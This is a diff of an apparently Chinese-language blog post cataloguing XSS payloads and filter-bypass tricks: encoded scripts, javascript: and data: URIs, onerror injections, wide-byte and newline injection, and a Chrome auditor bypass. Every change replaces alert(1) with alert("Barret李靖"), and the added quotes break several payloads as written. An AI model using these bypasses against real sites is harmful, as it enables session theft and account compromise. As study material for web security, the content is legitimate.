@@ -32,7 +32,7 @@ tags: xss
     
 **2. html实体编码**
 
-    > "alert(1)".replace(/./g, function(s){
+    > "alert("Barret李靖")".replace(/./g, function(s){
          return "&#" + s.charCodeAt(0)
           /*.toString(16) 转换成16进制也可以滴*/
           + ";"
@@ -52,16 +52,16 @@ tags: xss
     &colon; 冒号
     &NewLine; 换行
     
-    <a href="javascr&NewLine;ipt&colon;alert(1)">XSS</a>
+    <a href="javascr&NewLine;ipt&colon;alert("Barret李靖")">XSS</a>
     
 **5. JS进制转换**
     
     > "\74\163\143\162\151\160\164\76\141\154\145\162\164\50\61\51\74\57\163\143\162\151\160\164\76"
-    > "<script>alert(1)</script>"
+    > "<script>alert("Barret李靖")</script>"
     
 **6. Base64转换**
 
-    > base64("<script>alert(1)</script>");
+    > base64("<script>alert("Barret李靖")</script>");
     > PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
     
     <a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>
@@ -104,7 +104,7 @@ tags: xss
 
 1）srcdoc属性（chrome有效）
 
-    <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+    <iframe srcdoc="&lt;script&gt;alert("Barret李靖")&lt;/script&gt;"></iframe>
 
 2）autofoucus
 
@@ -113,17 +113,17 @@ tags: xss
 3）object
 
     <object classid="clsid:333c7bc4-460f-11d0-bc04-0080c7055a83">
-        <param name="dataurl" value="javascript:alert(1)">
+        <param name="dataurl" value="javascript:alert("Barret李靖")">
     </object>
 
 **11.绕过浏览器过滤（crhome）**
 
-    ?t="><img src=1 onerror=alert(1)>
+    ?t="><img src=1 onerror=alert("Barret李靖")>
     <input type="hidden" id="sClientUin" value="{{t}}">
 
     浏览器会过滤onerror中的代码，所以换种方式注入
 
-    ?t="><script src="data:text/html,<script>alert(1)</script><!--
+    ?t="><script src="data:text/html,<script>alert("Barret李靖")</script><!--
 
 chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。
 
@@ -140,7 +140,7 @@ chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码�
 
 **1. javascript:和vbscript:协议执行后的结果将会映射在DOM**后面。
 
-    <a href="javascript:'\x3cimg src\x3dx onerror=alert(1)>'">click me</a>
+    <a href="javascript:'\x3cimg src\x3dx onerror=alert("Barret李靖")>'">click me</a>
 
 **2. 变量覆盖**
 
@@ -151,7 +151,7 @@ chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码�
 
     <meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)">
     Javascript: 协议可能被禁止，可以使用 data:
-    <meta http-equiv="refresh" content="0; url=data:text/html,<script>alert(1)</script>">
+    <meta http-equiv="refresh" content="0; url=data:text/html,<script>alert("Barret李靖")</script>">
 
 **4. css注入**
 
@@ -185,18 +185,18 @@ cb为回调函数，如果后端并没有对callback字段进行过滤，则可�
 
 **6. 提前闭合双引号**
 
-    <input type="text" value="XSS&quot; onclick=&quot;alert(1)" />
+    <input type="text" value="XSS&quot; onclick=&quot;alert("Barret李靖")" />
 
-    <!--<img src="--><img src=x onerror=alert(1)//">
-    <comment><img src="</comment><img src=x onerror=alert(1)//">
-    <![><img src="]><img src=x onerror=alert(1)//">
-    <style><img src="</style><img src=x onerror=alert(1)//">
+    <!--<img src="--><img src=x onerror=alert("Barret李靖")//">
+    <comment><img src="</comment><img src=x onerror=alert("Barret李靖")//">
+    <![><img src="]><img src=x onerror=alert("Barret李靖")//">
+    <style><img src="</style><img src=x onerror=alert("Barret李靖")//">
 
 **7. 阻止编码**
 
-    ?t=;alert(1)
+    ?t=;alert("Barret李靖")
     <script type="text/javascript">
-        var t = query(t); // t = "&quot;;alert(1)"
+        var t = query(t); // t = "&quot;;alert("Barret李靖")"
     </script>
 
 上面可以看到 ";" 被编码了，观察页面编码：
@@ -205,26 +205,26 @@ cb为回调函数，如果后端并没有对callback字段进行过滤，则可�
 
 gbxxx系列编码，可以尝试宽字节：
 
-    ?t=%c0%22alert(1)
+    ?t=%c0%22alert("Barret李靖")
 
 **8. 攻击单行注释**
 
 URL对应的param中添加换行符（%0a）或者其他换行符。
 
-    ?t=%0aalert(1)//
+    ?t=%0aalert("Barret李靖")//
 
-    // init('id', "%0aalert(1)//");
+    // init('id', "%0aalert("Barret李靖")//");
 
     被解析成
 
     // init('id', "
-    alert(1)//");
+    alert("Barret李靖")//");
 
 **9. url**
 
 url中可以使用很多协议 http:// https:// javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。
 
-    <a href="data:text/html,<script>alert(1)</script>">XSS</a>
+    <a href="data:text/html,<script>alert("Barret李靖")</script>">XSS</a>
 
 **10. Flash跨域注入**
 
@@ -259,7 +259,7 @@ URL中的 `<`，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不�
 比如第二部分提出的第11点，浏览器的拦截
 
     
-    ?t="><script>alert(1)</script>
+    ?t="><script>alert("Barret李靖")</script>
 
 这样的插入会被拦截，当你发现源码中有这么一句话的时候：
 
@@ -271,7 +271,7 @@ URL中的 `<`，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不�
 
 便可以修改如上参数：
 
-    ?t="><scrWOWipt>alert(1)</scrWOWipt>
+    ?t="><scrWOWipt>alert("Barret李靖")</scrWOWipt>
 
 直接绕过了chrome浏览器对危险代码的防御。
 
@@ -299,7 +299,7 @@ URL中的 `<`，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不�
 注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确
 
 **4. 开搞**
-测试的时候alert(1),弹出成功再继续其他更邪恶的注入方式。
+测试的时候alert("Barret李靖"),弹出成功再继续其他更邪恶的注入方式。
 
 
 ## 六、XSS分类
